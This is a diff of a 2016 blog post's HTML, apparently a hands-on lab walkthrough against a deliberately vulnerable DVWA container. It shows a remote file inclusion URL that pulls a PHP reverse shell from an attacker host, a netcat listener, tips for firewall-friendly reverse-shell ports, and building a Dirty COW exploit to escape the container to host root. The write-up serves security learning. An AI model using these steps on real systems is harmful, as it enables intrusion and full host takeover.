@@ -77,12 +77,11 @@
 
 <p>I’m working off a different Ubuntu image than I usually work off of because I want to be sure my exploits will work (cheating, I know). If we go <a href="http://releases.ubuntu.com/">here</a> we can find old version of Ubuntu and it even tags the date they were released. I downloaded and installed Server 14.04.5 and installed a few applications</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;Install the OS, select the SSH Server as the additional functionality&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Install the OS, select the SSH Server as the additional functionality&gt;
 sudo apt-get install git docker.io
 sudo usermod -aG docker $USER
 &lt;reboot or log out and back in&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>That’s enough believe it or not, the rest will come with our container.</p>
 
@@ -90,14 +89,13 @@ sudo usermod -aG docker $USER
 
 <p>You can follow the instructions in the README or do just do this:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>git clone https://github.com/remotephone/dvwa-lamp.git
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/remotephone/dvwa-lamp.git
 cd dvwa-lamp
 docker build -t remotephone/dvwa-lamp .
 docker run -d -p 80:80 -p 3306:3306 remotephone/dvwa-lamp 
 &lt;wait some seconds and then browse to...&gt;
 http://&lt;Victim IP&gt;/setup.php
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>And you’re set! Install the database by completed the setup and login as admin/password.</p>
 
@@ -111,11 +109,10 @@ http://&lt;Victim IP&gt;/setup.php
 
 <p>To make this work, you need a few things. First, get your container running. Next, get you webshells ready in your /var/www/html directory. I’m using php-reverse-shell.php from the laudunum package and I’ve updated the file to point back to my attacking server. I always use ports 443 or 80 if possible for reverse shells, firewalls tend to allow this traffic out and it’s not suspicious if someone netstats an affected server. This is the part of the webshell I modified:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>$VERSION = "1.0";
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$VERSION = "1.0";
 $ip = '192.168.1.20';  // CHANGE THIS
 $port = 443;       // CHANGE THIS
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>It’s conveniently marked with “CHANGE THIS” so you know what to update. If you want to change some of the actions under $shell, you can, especially if for some reason bash or sh is not in the /bin/ directory. Now let’s get a shell.</p>
 
@@ -123,9 +120,8 @@ $port = 443;       // CHANGE THIS
 
 <p>First we’ll go to the File Inclusion page. At this point, my attacking machine has apache running, I’ve copied and fixed my reverse shell, hosted it in my /var/www/html folder, renamed it something short and easy to call, I’ve started a nc listener with nc -nlvp 443 and I’ve browsed to the RFI page (whew). The RFI is easy peasy here, this request in your browser will trigger it:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://192.168.1.16/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.1.16/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
+</code></pre></div></div>
 
 <p>It’s important to use the .txt extension since using .php will cause your own system to interpret the script and you’ll reverse shell yourself, which isn’t as exciting. In this particular page, you can View Source to see the site isn’t doing anything to append anything to your requested page, so you don’t need to use null characters to terminate the request.</p>
 
@@ -133,11 +129,11 @@ $port = 443;       // CHANGE THIS
 
 <p>Now we’ve got a reverse shell. Now what? It’s time to enumerate. Since I borrowed this container from tutum, there was some learning I had to do. If we enumerate the kernels, we learn that we’re running a version that’s vulnerable to dirtyc0w. Since the container is simply an “isolated” sandbox on the VM, we can expect it to be running the same kernel version as the VM, and we’re right (some IPs might not match in screenshots because I’ve messed with VMs quite a bit for other stuff since I started this post, but the idea is the same):</p>
 
-<p><img src="http://0.0.0.0:4000/images/kernels.png" alt="Kernels" class="center-image" /></p>
+<p><img src="http://localhost:4000/images/kernels.png" alt="Kernels" class="center-image" /></p>
 
 <p>For giggles, let’s run a Centos container and see what it’s running under the hood.</p>
 
-<p><img src="http://0.0.0.0:4000/images/Centosbuntu.png" alt="Centosbuntu" class="center-image" /></p>
+<p><img src="http://localhost:4000/images/Centosbuntu.png" alt="Centosbuntu" class="center-image" /></p>
 
 <p>That’s interesting! There’s no difference between the kernel in the container and the one in the VM. It’d be interesting to see how important that is for packages that expect to be run in CentOS, but that’s kind of outside the scope of what I’m doing. Let’s keep moving forward.</p>
 
@@ -157,41 +153,38 @@ $port = 443;       // CHANGE THIS
 
 <p>In the spirit of living off the land, let’s start with what got us here to begin with, php. We have rights to the system, we can move around in a shell, let’s see if we can execute arbitrary php. This isn’t pretty, but it proves my point, we can execute arbitrary php commands.</p>
 
-<p><img src="http://0.0.0.0:4000/images/whichesphp.png" alt="Whiches and php" class="center-image" /></p>
+<p><img src="http://localhost:4000/images/whichesphp.png" alt="Whiches and php" class="center-image" /></p>
 
 <p>So great, we can move stuff in and out, but you can see we can’t even compile anything locally once it’s on there. I checked a handful of popular containers like the CentOS one, redis, and jenkins and they all come pretty bare. These are some results from redis and jenkins:</p>
 
-<p><img src="http://0.0.0.0:4000/images/whichredisjenkins.png" alt="Installed default packages" class="center-image" /></p>
+<p><img src="http://localhost:4000/images/whichredisjenkins.png" alt="Installed default packages" class="center-image" /></p>
 
 <p>I don’t really know a lot of ways to deal with this gracefully. If you don’t have anything on the system and you can’t or don’t want to install additional packages, the only option I know is compiling it elsewhere and bringing it to the server. Let’s find somewhere we can write to, then we’ll use php to bring in our exploit. We need somewhere we can write to, and /tmp is often available. The same is the case here:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>$ ls -asl /tmp
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -asl /tmp
 total 8
 4 drwxrwxrwt  2 root root 4096 Jan 12 03:21 .
 4 drwxr-xr-x 54 root root 4096 Jan 12 03:21 ..
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="compiling-your-exploit">Compiling your exploit.</h3>
 
 <p>We already know the kernel version, 4.4.0-31 and we don’t have an image laying around with that particular version, but we do have an updated image in an VM we have sitting around. To install the appropriate kernel, we need to find it. Search &lt;distroname&gt; &lt;kernelversion&gt; in google and you’ll hopefully find something like <a href="http://packages.ubuntu.com/xenial/amd64/linux-image-4.4.0-31-generic/download">this page</a> where you can download and install the kernel with:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>dpkg -i linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg -i linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
+</code></pre></div></div>
 
 <p>You might also need the image-extra or headers package. Reboot into your new kernel, make sure you have the appropriate packages installed, then compile it. If you don’t have everything installed, this is the full process:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>sudo apt-get install git nasm make gcc
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install git nasm make gcc
 git clone https://github.com/scumjr/dirtycow-vdso.git
 cd dirtycow-vdso
 make
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Now move the file off your test system, on to your attacking host and into your /var/www/html folder. From here, you should be able to get into /tmp, pull the file into your victim host, change permissions, run the exploit, and get your shell. Since you’re sending a shell back to your container from the host, you need to make sure you send it to the proper IP. By default, the exploit uses 127.0.0.1, which will not work. You only get one chance with this exploit if it goes wrong, so make sure you send it to the docker eth0 and you’ll get your shell back as root inside the host!</p>
 
-<p><img src="http://0.0.0.0:4000/images/fullescape.png" alt="Full Escape" class="center-image" /></p>
+<p><img src="http://localhost:4000/images/fullescape.png" alt="Full Escape" class="center-image" /></p>
 
 <p>And there you go, you’ve successfully gone from a web application, to a container shell, to a full host escape and root! Sobering stuff.</p>
 
@@ -207,34 +200,9 @@ make
     Written on December 27, 2016
   </div>
 
-    <div id="disqus_thread"></div>
-<script>
-
-/**
-*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-/*
-var disqus_config = function () {
-this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-};
-*/
-(function() { // DON'T EDIT BELOW THIS LINE
-var d = document, s = d.createElement('script');
-s.src = '//remotephone-github-io.disqus.com/embed.js';
-s.setAttribute('data-timestamp', +new Date());
-(d.head || d.body).appendChild(s);
-})();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-    <script id="dsq-count-scr" src="//remotephone-github-io.disqus.com/count.js" async></script>
-
-
 </article>
 
     </div>
-
 
 
 
